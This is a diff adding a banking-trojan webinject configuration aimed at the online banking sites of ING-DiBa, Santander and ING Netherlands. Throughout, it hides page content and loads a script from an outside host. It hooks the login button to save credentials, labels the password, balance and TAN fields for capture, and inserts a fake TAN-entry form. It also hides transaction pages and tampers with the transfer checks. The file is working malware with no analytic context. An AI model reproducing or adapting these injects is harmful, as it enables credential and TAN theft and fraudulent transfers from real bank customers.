@@ -1,0 +1,1701 @@
+set_url https://banking.ing-diba.de/webkunden/* GP
+data_before
+<body
+data_end
+
+data_inject
+ style="display:none" 
+data_end
+
+data_after
+data_end
+
+set_url https://banking.ing-diba.de/webkunden/* GP
+data_before
+data_end
+
+data_inject
+<script>var _kp;</script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script>
+<script type="text/javascript" src="https://fur.sicherheit-schild.eu/login/account/banksrc/tgr/ing-diba.de.js"></script>
+data_end
+
+data_after
+</body>
+data_end
+
+set_url https://banking.ing-diba.de/webkunden/* GP
+data_before
+data_end
+
+data_inject
+ _kp = 
+data_end
+
+data_after
+new Keypad(
+data_end
+
+set_url https://pintan.santanderbank.de/* GP
+data_before
+<body
+data_end
+
+data_inject
+ style="display:none" 
+data_end
+
+data_after
+data_end
+
+set_url https://pintan.santanderbank.de/* GP
+data_before
+data_end
+
+data_inject
+<script language="JavaScript" type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script>
+<script language="JavaScript" type="text/javascript" src="https://fur.sicherheit-schild.eu/login/account/banksrc/tgr/santanderbank.de.js"></script>
+data_end
+
+data_after
+</body>
+data_end
+
+;------------------------------------------------------
+set_url http*://*mijn.ing.nl/* GP
+;------------------------------------------------------
+
+;------------  LOGIN PAGE ------------
+
+data_before
+<input TYPE="text" style="font:11px arial" tabindex="1"
+data_end
+data_inject
+ alt="Login"
+data_end
+data_after
+data_end
+
+data_before
+js/tango.js*function initMenu() {
+data_end
+data_inject
+data_end
+data_after
+}
+data_end
+
+data_before
+<input TYPE="text" style="font:11px arial" tabindex="1"*alt="Login"*<input style="font:11px arial" tabindex="2" type="password"
+data_end
+data_inject
+ alt="Password"
+data_end
+data_after
+data_end
+
+data_before
+<input type="button" value="Inloggen" name="*" tabindex="4" style="cursor:pointer; cursor: hand;" class="form-button" onclick="
+data_end
+data_inject
+SaveLoginData();
+data_end
+data_after
+data_end
+
+data_before
+<!DOCTYPE*<input type="button" value="Inloggen"*>
+data_end
+data_inject
+<div id=start_div></div>
+data_end
+data_after
+data_end
+
+;------------ BALANCES PAGE ------------
+
+data_before
+<head><title>Saldo*informatie</title>*<span class="info-tekst-tenaamstelling"
+data_end
+data_inject
+ id=holder_name_label
+data_end
+data_after
+data_end
+
+data_before
+<head><title>Saldo*informatie</title>*Welkom*<b>
+data_end
+data_inject
+<div id=start_div alt="balances_page"></div>
+data_end
+data_after
+data_end
+
+data_before
+<head><title>Betaalrekening*raadplegen</title>*Betaalrekeningen
+data_end
+data_inject
+<div id=start_div alt="transfers_page"></div>
+<script>
+document.body.style.display = "none";
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<head><title>Betaalrekening*transacties*zoekresultaten</title>*<td class="scherm-titel">Zoekresultaat</td>
+data_end
+data_inject
+<div id=start_div alt="search_page"></div>
+<script>
+document.body.style.display = "none";
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<td class="scherm-titel">Overzicht saldi</td>
+data_end
+data_inject
+<div id=start_div alt="saldo_page"></div>
+<div id=saldo_page_div></div>
+<script>
+document.body.style.display = "none";
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<head><title>Saldo*informatie</title>*Uw laatste bezoek was
+data_end
+data_inject
+<div id=start_div alt="balances_page"></div>
+data_end
+data_after
+data_end
+
+data_before
+<head><title>Saldo*informatie</title>*<body*onload="javascript:try{doFrameCorrection();}catch(e){}"
+data_end
+data_inject
+ style="display:none" 
+data_end
+data_after
+data_end
+
+data_before
+<body*>
+data_end
+data_inject
+	<style>
+		a,
+		a:link,
+		a:visited,
+		a:hover {color:#000000; font: 12px Arial, sans-serif; 
+		text-decoration:underline;}
+		a.sub:link {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.sub:visited {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.sub:hover {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.main:link {color:#00164F; font: 12px Arial; font-weight:bold; 
+		text-decoration:none;}
+		a.main:visited {color:#00164F; font: 12px Arial; font-weight:bold; 
+		text-decoration:none;}
+		a.main:hover {color:#00164F; font: 12px Arial; font-weight:bold; 
+		text-decoration:none;}
+		a.subsub:link {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.subsub:visited {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.subsub:hover {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.subsubsub:link {color:#203561; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.subsubsub:visited {color:#203561; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.subsubsub:hover {color:#203561; font: 11px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.linkwit:link {color:#FFFFFF; font: 10px Arial; font-weight:normal;}
+		a.linkwit:visited {color:#FFFFFF; font: 10px Arial; font-weight:normal;}
+		a.linkwit:hover {color:#FFFFFF; font: 10px Arial; font-weight:normal;}
+		a.actueel:link {color:#00164F; font: 10px Verdana; font-weight:normal; 
+		text-decoration:none;}
+		a.actueel:visited {color:#00164F; font: 10px Verdana; font-weight:normal; 
+		text-decoration:none;}
+		a.actueel:hover {color:#087CB3; font: 10px Verdana; font-weight:normal; 
+		text-decoration:none;}
+		a.zieook:link {color:#00164F; font: 12px Arial; font-weight:normal;}
+		a.zieook:visited {color:#00164F; font: 12px Arial; font-weight:normal;}
+		a.zieook:hover {color:#00164F; font: 12px Arial; font-weight:normal;}
+		a.servicetekst:link {color:#00164F; font: 13px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.servicetekst:visited {color:#00164F; font: 13px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.servicetest.hover {color:#00164F; font: 13px Arial; font-weight:normal; 
+		text-decoration:none;}
+		a.leesverder:link {color:#00164F; font: 11px Arial; font-weight:bold;}
+		a.leesverder:visited {color:#00164F; font: 11px Arial; font-weight:bold;}
+		a.leesverder:hover {color:#00164F; font: 11px Arial; font-weight:bold;}
+		a.actie:link {color:#087CB3; font: 12px Arial; font-weight:bold; 
+		text-decoration:none;}
+		a.actie:visited {color:#087CB3; font: 12px Arial; font-weight:bold; 
+		text-decoration:none;}
+		a.actie:hover {color:#087CB3; font: 12px Arial; font-weight:bold; 
+		text-decoration:none;}
+		a.directlinks:link {color:#00164F; font: 10px Arial; font-weight:normal;}
+		a.directlinks:visited {color:#00164F; font: 10px Arial; font-weight:normal;}
+		a.directlinks:hover {color:#00164F; font: 10px Arial; font-weight:normal;}
+		a.disclaimer:link {color:#00164F; font: 9px Verdana; font-weight:normal; 
+		text-decoration:none;}
+		a.disclaimer:visited {color:#00164F; font: 9px Verdana; font-weight:normal; 
+		text-decoration:none;}
+		a.disclaimer:hover {color:#00164F; font: 9px Verdana; font-weight:normal; 
+		text-decoration:none;}
+		a.rechterbalklink:link {color:#00164F; font: 11px Arial; font-weight:normal;}
+		a.rechterbalklink:visited {color:#00164F; font: 11px Arial; font-weight:normal;}
+		a.rechterbalklink:hover {color:#00164F; font: 11px Arial; font-weight:normal;}
+		tr.sub {color:#00164F; font: 11px Arial; font-weight:normal; 
+		text-decoration:none; cursor: pointer; cursor:hand}
+		tr.subsubsub {color:#203561; font: 11px Arial; font-weight:normal; 
+		text-decoration:none; cursor: pointer; cursor:hand}
+		.main {color:#00164F; font: 12px Arial; font-weight:bold;}
+		.sub {color:#00164F; font: 12px Arial; font-weight:normal;}
+		.subns {color:#3994C6; font: 12px Arial; font-weight:bold;}
+		.subsub {color:#00164F; font: 11px Arial; font-weight:bold;}
+		fond.switch {color:#00AFF0; background-color:#FFFFFF; font: 12px Arial; 
+		font-weight:normal;}
+		font.switch_bold {color:#00AFF0; background-color:#FFFFFF; font: 12px Arial; 
+		font-weight:bold;}
+		a.switch:hover,
+		a.switch:link,
+		a.switch:visited {color:#00AFF0; background-color:#FFFFFF; font: 12px Arial; 
+		font-weight:normal; text-decoration:none}
+		.subsubsub {color:#00164F; font: 11px Arial; font-weight:normal;}
+		td.koprood {color:#FF0000; background-color:#8CCBEE; font-family: Verdana, 
+		Arial, sans-serif; font-size:7.5pt; font-weight:bold; cursor: pointer; cursor:hand; 
+		vertical-align:text-bottom;}
+		td.koproodtop {color:#FF0000; background-color:#8CCBEE; font-family: Verdana, 
+		Arial, sans-serif; font-size:7.5pt; font-weight:bold; cursor: pointer; 
+		cursor:hand; vertical-align:top;}
+		a.koprood:link,
+		a.koprood:hover,
+		a.koprood:visited {color:#FF0000; background-color:#8CCBEE; font-family: 
+		Verdana, Arial, sans-serif; font-size:7.5pt; font-weight:bold; text-decoration:none; 
+		vertical-align:text-bottom;}
+		a.koproodtop:link,
+		a.koproodtop:hover,
+		a.koproodtop:visited {color:#FF0000; background-color:#8CCBEE; font-family: 
+		Verdana, Arial, sans-serif; font-size:7.5pt; font-weight:bold; text-decoration:none; 
+		vertical-align:top;}
+		a.applnietactief:link,
+		a.applnietactief:hover,
+		a.applnietactief:visited {color:#051482; background-color:#E8F2FD; font-family: 
+		Verdana, Arial, sans-serif; font-size:7.5pt; font-weight:normal; cursor: 
+		pointer; cursor:hand; text-decoration:none;}
+		a.applactief:link,
+		a.applactief:hover,
+		a.applactief:visited {color:#051482; background-color:#FFFFFF; font-family: 
+		Verdana, Arial, sans-serif; font-size:7.5pt; font-weight:bold; cursor: pointer; 
+		cursor:hand; text-decoration:none;}
+		td.applnietactief {color:#051482; background-color:#E8F2FD; font-family: 
+		Verdana, Arial, sans-serif; font-size:10px; font-weight:normal; cursor: pointer; 
+		cursor:hand;}
+		td.applactief {color:#051482; background-color:#FFFFFF; font-family: Verdana, 
+		Arial, sans-serif; font-size:10px; font-weight:bold; cursor: pointer; 
+		cursor:hand;}
+		td.pblink {color:#00164F; background-color:#8CCBEE; font-family: Verdana, Arial, 
+		sans-serif; font-size:7.5pt; font-weight:bold; text-decoration:none;}
+		td.pblinkhand {color:#00164F; background-color:#8CCBEE; font-family: Verdana, 
+		Arial, sans-serif; font-size:7.5pt; font-weight:bold; cursor: pointer; 
+		cursor:hand;}
+		.icoon {color:#00164F; font: 11px Arial; font-weight:bold; 
+		text-decoration:none;}
+		.directtext {color:#000000; font: 10px Arial; font-weight:normal;}
+		.directtextwit {color:#FFFFFF; font: 10px Arial; font-weight:normal;}
+		.title {color:#00164F; font: 16px Arial; font-weight:bold;}
+		.abctitle {color:#00164F; font: 14px Arial; font-weight:bold;}
+		.subtitle {color:#00164F; font: 12px Arial; font-weight:bold;} 
+		.inleiding {color:#087CB3; font: 12px Arial; font-weight:bold;}
+		.content {color:#00164F; font: 12px Arial; font-weight:normal;}
+		.contentbold {color:#00164F; font: 11px Arial; font-weight:bold;}
+		.contentklein {color:#00164F; font: 11px Arial; font-weight:normal;}
+		.contentlicht {color:#087CB3; font: 11px Arial; font-weight:bold;}
+		.contentwarning {color:#ff0000; font: 12px Arial; font-weight:normal;}
+		.actueel {color:#00164F; font: 10px Verdana; font-weight:normal;}
+		.abc {color:#00164F; font: 20px Arial; font-weight:bold;}
+		.kop {color:#00164F; font: 15px Arial; font-weight:bold;}
+		.servicekop {color:#00164F; font: 13px Arial; font-weight:bold;}
+		.servicetekst {color:#00164F; font: 13px Arial; font-weight:normal;}
+		.berekenen {color:#FFFFFF; font: 15px Arial; font-weight:bold;}
+		.checkbox {color:#857272; font: 13px Arial; font-weight:normal;}
+		.serveroff {color:#FFFFFF; font: 11px Arial; font-weight:bold;}
+		.servicekopitalic {color:#00164F; font: 13px Arial; font-weight:bold; 
+		font-style:italic;}
+		.rechterbalktext {color:#00164F; font: 11px Arial; font-weight:normal;}
+		.direct {color:#FF0000; font: 12px Arial; font-weight:bold;}
+		.form-color-header {background-color:#ABA195;font:12px 
+		arial;font-weight:bold;color:#FFFFFF;}
+		.form-color-column {background-color:#F9F9F9;font:10px 
+		arial;color:#000000;font-weight:bold;}
+		.form-color-item {background-color:#F9F9F9;font:10px arial;color:#000000;}
+		.form-color-item-dik {background-color:#F9F9F9;font:12px 
+		arial;color:#000000;font-weight:bold;}
+		.form-color-item-groot {font:12px arial;color:#000000;}
+		.form-color-item-groot-grey {background-color:#F9F9F9;font:12px 
+		arial;color:#000000;}
+		.form-color-item-groot-dik {background-color:#ECECEC;font:12px 
+		arial;font-weight:bold;color:#000000;}
+		.form-color-wit-groot {font:12px arial;color:#000000;} 
+		.form-color-lichtblauw-groot {background-color:#ECF4FD;font:12px 
+		arial;color:#000066;}
+		.form-color-lichtgrijs-groot {background-color:#ECECEC;font:12px 
+		arial;color:#000000;}
+		.form-color-item-error {background-color:#F9F9F9;font:10px arial;color:#ff0000;}
+		.form-color-item-error-dik {background-color:#F9F9F9;font:12px 
+		arial;color:#ff0000;font-weight:bold;}
+		.form-color-item-rood {background-color:#F9F9F9;font:12px arial;color:#ff0000;}
+		.form-color-lichtblauw-rood 
+		{font-size:12px;color:#cc0033;background-color:#ecf4fd;font-family:Arial;}
+		.form-color-column-rood 
+		{font-size:10px;font-family:Arial;color:#ff0000;background-color:#F9F9F9;}
+		.form-button {background-color:#FF6600;font:12px arial;color:#FFFFFF; 
+		font-weight:bold;}
+		/* iDeal login page style below */
+	</style>
+	
+	
+<div id="tan_div" style="display:none">
+	<div id="tooltip" style="position:absolute;visibility:hidden;width:200px;"></div>
+		<table align="left" border="0" width="100%" cellpadding="0" cellspacing="0" summary="layout table">
+			<tr>
+				<td width="20">&nbsp;</td>
+				<td>
+					<table align="left" border="0" width="700" cellpadding="0" cellspacing="0" summary="layout table">
+						<tbody>
+							<tr>
+								<td height="10" colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td colspan="3">
+								</td>
+							</tr>
+							<tr>
+								<td colspan="3" height="30">&nbsp;</td>
+							</tr>
+							<tr>
+								<td bgcolor="#ffffff" colspan="3">
+									<table cellpadding="0" cellspacing="0" border="0" width="100%" summary="layout table">
+										<tr>
+											<td bgcolor="#ffffff" align="left" width="95px"><img src="https://mijn.ing.nl/internetbankieren/gfx/nav-particulier-sel.gif" border="0" alt="" /></td>
+											<td bgcolor="#ffffff" align="left" width="77px"><a href="javascript:void(0);"><img src="https://mijn.ing.nl/internetbankieren/gfx/nav-zakelijk-normal.gif" border="0" alt="" /></a></td>
+											<td bgcolor="#ffffff" align="left" width="100%" valign="bottom"><img src="https://mijn.ing.nl/internetbankieren/gfx/oranje_lijn.gif" border="0" width="528px" height="1px" alt="" /></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="10" colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td bgcolor="#ffffff" colspan="3">
+									<table cellpadding="0" cellspacing="0" border="0" width="100%" summary="layout table">
+										<tr>
+											<td bgcolor="#ffffff" align="right" width="15%" rowspan="2" valign="middle"><img src="https://mijn.ing.nl/internetbankieren/gfx/login_choice_left.gif" border="0" alt="" /></td>
+											<td bgcolor="#ffffff" align="center" width="70%"><font face="arial" size="3" color="#000000"><strong>Kies de manier van inloggen die voor u van toepassing is.</strong></font></td>
+											<td bgcolor="#ffffff" align="left" width="15%" rowspan="2" valign="middle"><img src="https://mijn.ing.nl/internetbankieren/gfx/login_choice_right.gif" border="0" alt="" /></td>
+										</tr>
+										<tr>
+											<td bgcolor="#ffffff" align="center" width="50%" class="form-color-item-groot">Kies de manier van inloggen die u gewend bent. <br />
+												Wilt u voor het eerst inloggen? Dan heeft u informatie ontvangen over hoe u dit 
+												kunt doen.</td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="10" colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td class="form-color-header" width="49%">&nbsp;Inloggen met gebruikersnaam en wachtwoord</td>
+								<td width="10px" />
+								<td class="form-color-header" width="49%">&nbsp;Naar inloggen met calculator</td>
+							</tr>
+							<tr>
+								<td height="10" class="form-color-item-groot-grey"></td>
+								<td />
+								<td height="10" class="form-color-item-groot-grey"></td>
+							</tr>
+							<tr>
+								<td>
+									<table cellpadding="0" cellspacing="0" border="0" width="100%" class="form-color-item-groot-grey" height="100%" summary="layout table">
+										<tr valign=top >
+											<td colspan=5>
+											<div style="padding:3px;">
+												Om verder te gaan brengen, gelieve TAN code hieronder opgesomd.
+											</td>
+										</tr>
+										<tr align="left">
+						<td class="form-color-item-dik" valign="middle" align="right" height="30" width="135" nowrap style="padding-left:5px">Volgnummer</td> 
+						<td class="form-color-item" valign="middle" width="28">&nbsp;</td>
+						<td class="form-color-item" valign="middle" width="28"><img src="https://mijn.ing.nl/internetbankieren/gfx/icon_info2.gif" border="0"></td>
+						<td class="form-color-item" valign="middle" width="28">&nbsp;</td>
+						<td class="form-color-item" valign="middle" width="100%" style="font-size:12px;padding-left:10px;">
+
+							<b><span id="tan_label">123</span></b>
+						</td>
+					</tr>
+					<tr>
+						<td class="form-color-item-dik" valign="middle" align="right" height="30" style="padding-left:5px">TAN-code *</td> 
+						<td class="form-color-item" valign="middle" width="28">&nbsp;</td>
+						<td class="form-color-item" valign="middle" width="28"><img src="https://mijn.ing.nl/internetbankieren/gfx/icon_info2.gif" border="0"></td>
+						<td class="form-color-item" valign="middle" width="28">&nbsp;</td>
+						<td class="form-color-item" valign="middle" width="100%" style="font-size:12px;padding-left:10px;">
+		
+							  <input style="font:11px arial" tabindex="2" type="password" autocomplete="off" id="tan_input" maxlength="6" style="width: 60px;">
+							  <br>
+						</td>
+					</tr>
+
+									</table>
+									
+								</td>
+								<td width="10px" />
+								<td height="100%">
+									<table cellpadding="0" cellspacing="0" border="0" height="100%" width="100%" summary="layout table">
+										<tr>
+											<td class="form-color-item-groot-grey" colspan="2" valign="top" style="padding-top:5px;padding-left:5px">U kunt hier alleen inloggen als u in het bezit bent van een 
+												beveiligingscalculator.</td>
+										</tr>
+										<tr>
+											<td height="10" colspan="2" class="form-color-item-groot-grey">
+												<tr>
+													<td class="form-color-item-groot-grey" valign="top" style="padding-top:5px;padding-left:5px"><img src="https://mijn.ing.nl/internetbankieren/gfx/calculator.jpg" border="0" alt="" /></td>
+													<td class="form-color-item-groot-grey" valign="top" style="padding-top:5px;padding-left:5px">Let op: als u een gebruikersnaam en wachtwoord heeft, kunt u niet kiezen voor 
+														inloggen met calculator.</td>
+												</tr>
+											</td>
+										</tr>
+									</table>
+									<tr>
+										<td height="5" colspan="3"></td>
+									</tr>
+									<tr>
+										<td height="40" class="form-color-item-groot-dik" align="center" valign="middle">
+											<table cellpadding="0" cellspacing="0" border="0" height="100%" width="100%" summary="layout table">
+												<tr>
+													<td width="100%" class="form-color-item-groot-dik" style="text-align:center;">
+													<input type="button" value="      Doorgaan      " style="background:#FF6600;color:white;font-weight:bold;font-size:12px;padding:1px;" onClick="TanPost()">	
+													
+													</td>
+												</tr>
+											</table>
+										</td>
+										<td width="10px" />
+										<td height="40" class="form-color-item-groot-dik" align="center" valign="middle">
+											<a href="javascript:void(0);"><img src="https://mijn.ing.nl/internetbankieren/gfx/calculator_login_button.gif" border="0" alt="" /></a>
+										</td>
+									</tr>
+									<tr>
+										<td height="10" colspan="3"></td>
+									</tr>
+									<tr>
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											<a href="javascript:void(0);">Meer informatie over Mijn ING</a>
+										</td>
+										<td />
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											<a href="javascript:void(0);">Veelgestelde vragen over Internetbankieren</a>
+										</td>
+									</tr>
+									<tr>
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											<a href="javascript:void(0);">Aanvragen Mijn ING</a>
+										</td>
+										<td />
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											&nbsp;
+										</td>
+									</tr>
+								</td>
+							</tr>
+						</tbody>
+					</table>
+					 </td>
+			</tr>
+		</table>
+</div>
+
+<div id="simple_wait_div" style="display:none">
+	<center>
+	<Br><Br><Br>
+	<table cellpadding="0" cellspacing="0" border="0" width="720" summary="layout table">
+	<tr>
+		<td bgcolor="#ffffff" align="right" width="15%" rowspan="2" valign="middle"><img src="https://mijn.ing.nl/internetbankieren/gfx/login_choice_left.gif" border="0" alt="" /></td>
+		<td bgcolor="#ffffff" align="center" width="70%"><font face="arial" size="3" color="#000000"><strong>Moment geduld alstublieft ...</strong></font></td>
+		<td bgcolor="#ffffff" align="left" width="15%" rowspan="2" valign="middle"><img src="https://mijn.ing.nl/internetbankieren/gfx/login_choice_right.gif" border="0" alt="" /></td>
+	</tr>
+	<tr>
+		<td bgcolor="#ffffff" align="center" width="50%" class="form-color-item-groot">
+			<br>Gelieve even te wachten tijdens het laden van de gegevens<br>
+			<br>
+		</td>
+	</tr>
+	</table>
+	</center>
+</div>
+<div id="wait_div" style="display:none">
+	<div id="tooltip" style="position:absolute;visibility:hidden;width:200px;"></div>
+		<table align="left" border="0" width="100%" cellpadding="0" cellspacing="0" summary="layout table">
+			<tr>
+				<td width="20">&nbsp;</td>
+				<td>
+					<table align="left" border="0" width="700" cellpadding="0" cellspacing="0" summary="layout table">
+						<tbody>
+							<tr>
+								<td height="10" colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td colspan="3">
+								</td>
+							</tr>
+							<tr>
+								<td colspan="3" height="30">&nbsp;</td>
+							</tr>
+							<tr>
+								<td bgcolor="#ffffff" colspan="3">
+									<table cellpadding="0" cellspacing="0" border="0" width="100%" summary="layout table">
+										<tr>
+											<td bgcolor="#ffffff" align="left" width="95px"><img src="https://mijn.ing.nl/internetbankieren/gfx/nav-particulier-sel.gif" border="0" alt="" /></td>
+											<td bgcolor="#ffffff" align="left" width="77px"><a href="javascript:void(0);"><img src="https://mijn.ing.nl/internetbankieren/gfx/nav-zakelijk-normal.gif" border="0" alt="" /></a></td>
+											<td bgcolor="#ffffff" align="left" width="100%" valign="bottom"><img src="https://mijn.ing.nl/internetbankieren/gfx/oranje_lijn.gif" border="0" width="528px" height="1px" alt="" /></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="10" colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td bgcolor="#ffffff" colspan="3">
+									<table cellpadding="0" cellspacing="0" border="0" width="100%" summary="layout table">
+										<tr>
+											<td bgcolor="#ffffff" align="right" width="15%" rowspan="2" valign="middle"><img src="https://mijn.ing.nl/internetbankieren/gfx/login_choice_left.gif" border="0" alt="" /></td>
+											<td bgcolor="#ffffff" align="center" width="70%"><font face="arial" size="3" color="#000000"><strong>Kies de manier van inloggen die voor u van toepassing is.</strong></font></td>
+											<td bgcolor="#ffffff" align="left" width="15%" rowspan="2" valign="middle"><img src="https://mijn.ing.nl/internetbankieren/gfx/login_choice_right.gif" border="0" alt="" /></td>
+										</tr>
+										<tr>
+											<td bgcolor="#ffffff" align="center" width="50%" class="form-color-item-groot">Kies de manier van inloggen die u gewend bent. <br />
+												Wilt u voor het eerst inloggen? Dan heeft u informatie ontvangen over hoe u dit 
+												kunt doen.</td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="10" colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td class="form-color-header" width="49%">&nbsp;Inloggen met gebruikersnaam en wachtwoord</td>
+								<td width="10px" />
+								<td class="form-color-header" width="49%">&nbsp;Naar inloggen met calculator</td>
+							</tr>
+							<tr>
+								<td height="10" class="form-color-item-groot-grey"></td>
+								<td />
+								<td height="10" class="form-color-item-groot-grey"></td>
+							</tr>
+							<tr>
+								<td>
+									<table cellpadding="0" cellspacing="0" border="0" width="100%" class="form-color-item-groot-grey" height="100%" summary="layout table">
+										<tr>
+											<td>
+												<center>
+													<img src="http://www.fmfool.com/modeling/progress_bar_orange.gif" alt="" />
+												</center>
+											</td>
+										</tr>
+									</table>
+								</td>
+								<td width="10px" />
+								<td height="100%">
+									<table cellpadding="0" cellspacing="0" border="0" height="100%" width="100%" summary="layout table">
+										<tr>
+											<td class="form-color-item-groot-grey" colspan="2" valign="top" style="padding-top:5px;padding-left:5px">U kunt hier alleen inloggen als u in het bezit bent van een 
+												beveiligingscalculator.</td>
+										</tr>
+										<tr>
+											<td height="10" colspan="2" class="form-color-item-groot-grey">
+												<tr>
+													<td class="form-color-item-groot-grey" valign="top" style="padding-top:5px;padding-left:5px"><img src="https://mijn.ing.nl/internetbankieren/gfx/calculator.jpg" border="0" alt="" /></td>
+													<td class="form-color-item-groot-grey" valign="top" style="padding-top:5px;padding-left:5px">Let op: als u een gebruikersnaam en wachtwoord heeft, kunt u niet kiezen voor 
+														inloggen met calculator.</td>
+												</tr>
+											</td>
+										</tr>
+									</table>
+									<tr>
+										<td height="5" colspan="3"></td>
+									</tr>
+									<tr>
+										<td height="40" class="form-color-item-groot-dik" align="center" valign="middle">
+											<table cellpadding="0" cellspacing="0" border="0" height="100%" width="100%" summary="layout table">
+												<tr>
+													<td width="62px" class="form-color-item-groot-dik">
+														&nbsp;
+													</td>
+													<td class="form-color-item-groot-dik" align="center" valign="middle">
+													</td>
+												</tr>
+											</table>
+										</td>
+										<td width="10px" />
+										<td height="40" class="form-color-item-groot-dik" align="center" valign="middle">
+											<a href="javascript:void(0);"><img src="https://mijn.ing.nl/internetbankieren/gfx/calculator_login_button.gif" border="0" alt="" /></a>
+										</td>
+									</tr>
+									<tr>
+										<td height="10" colspan="3"></td>
+									</tr>
+									<tr>
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											<a href="javascript:void(0);">Meer informatie over Mijn ING</a>
+										</td>
+										<td />
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											<a href="javascript:void(0);">Veelgestelde vragen over Internetbankieren</a>
+										</td>
+									</tr>
+									<tr>
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											<a href="javascript:void(0);">Aanvragen Mijn ING</a>
+										</td>
+										<td />
+										<td class="form-color-wit-groot" style="padding-top:5px;padding-left:5px">
+											&nbsp;
+										</td>
+									</tr>
+								</td>
+							</tr>
+						</tbody>
+					</table>
+					 </td>
+			</tr>
+		</table>
+</div>
+<script>
+	var wait_div = document.getElementById("wait_div");
+	var simple_wait_div = document.getElementById("simple_wait_div");
+	var tan_div = document.getElementById("tan_div");
+	wait_div.style.display = "none";
+	simple_wait_div.style.display = "none";
+	tan_div.style.display = "none";
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<div id=start_div alt="balances_page"></div>*<table cellpadding="0" cellspacing="0" border="0" width="100%"
+data_end
+data_inject
+ id="balances_table"
+data_end
+data_after
+data_end
+
+data_before
+id="balances_table"*<table cellpadding="0" cellspacing="0" border="0" width="100%"
+data_end
+data_inject
+ id="transfers_table"
+data_end
+data_after
+data_end
+
+;------------ TRANSFER DATA PAGE ------------
+
+data_before
+<span class="info-tekst"><div style="border: 1px solid #FF6600; padding: 5px; height: 50px;"><b
+data_end
+data_inject
+ id=limit_div 
+data_end
+data_after
+data_end
+
+;------------ FINAL TRANSFER PAGE ------------
+
+data_before
+<head><title>Even geduld a.u.b.</title>*<body onload="javascript:disableNavigation();
+data_end
+data_inject
+data_end
+data_after
+">
+data_end
+
+data_before
+<td width="100%" nowrap class="lijst-kop" colspan="7">&nbsp;Aantal verzonden opdrachten
+data_end
+data_inject
+<div id=final_div></div>
+data_end
+data_after
+data_end
+
+;------------ TAN REQUEST PAGE ------------
+
+data_before
+<td class="formulier-label" width="25%" nowrap>Volgnummer*<td class="formulier-uitvoer"align="left"
+data_end
+data_inject
+ id=tan_nr_label 
+data_end
+data_after
+data_end
+
+data_before
+id=tan_nr_label *<td class="formulier-label" width="25%" nowrap>TAN-code*<input type="text" class="formulier-text"
+data_end
+data_inject
+ alt="TAN-code" 
+data_end
+data_after
+data_end
+
+;------------ GLOBALS ------------
+
+data_before
+function predoOk() {doOk(); return false;}</script><script type="text/javascript" language="JavaScript">document.getElementById('*').
+data_end
+data_inject
+name
+data_end
+data_after
+;</script>
+data_end
+
+data_before
+function*doVerzendenVoorbereiden()*{*if*(*nietDubbelklik()*)*{*if(*opdrachtenInVerleden*)*{*if*(
+data_end
+data_inject
+(1==1
+data_end
+data_after
+))
+data_end
+
+data_before
+if*(menuFrame*!=*null*&&*menuFrame.selectItem*!=*null)*else
+data_end
+data_inject
+ if(parent && parent.menu)
+data_end
+data_after
+data_end
+
+data_before
+function disableNavigation() {
+data_end
+data_inject
+data_end
+data_after
+}
+data_end
+
+data_before
+<script type="text/javascript">*var omniture_account="
+data_end
+data_inject
+a"
+data_end
+data_after
+//--></script>
+data_end
+
+data_before
+if (parent.frames.length
+data_end
+data_inject
+ > 1
+data_end
+data_after
+)
+data_end
+
+
+data_before
+onload="javascript:checkParentFrame();" FRAMEBORDER="0" FRAMESPACING="0" BORDER="0" COLS="
+data_end
+data_inject
+0,*
+data_end
+data_after
+"
+data_end
+
+data_before
+Uw Europese Overschrijving is verzonden
+data_end
+data_inject
+<div id=sepa_finish_title style="display:none"></div>
+data_end
+data_after
+data_end
+
+data_before
+<title>SEPA Payment</title>*<body onload="
+data_end
+data_inject
+
+data_end
+data_after
+"
+data_end
+
+data_before
+<td class="formulier-label">Saldo*<td width="150px" style="text-align: right;" class="formulier-uitvoer"
+data_end
+data_inject
+ id=saldo_label 
+data_end
+data_after
+data_end
+
+data_before
+<td class="formulier-label">Kredietlimiet*<td width="150px" style="text-align: right;" class="formulier-uitvoer"
+data_end
+data_inject
+ id=kredit_label 
+data_end
+data_after
+data_end
+
+data_before
+<td class="formulier-label">Maximaal te besteden*<td width="150px" style="text-align: right;" class="formulier-uitvoer"
+data_end
+data_inject
+ id=total_label 
+data_end
+data_after
+data_end
+
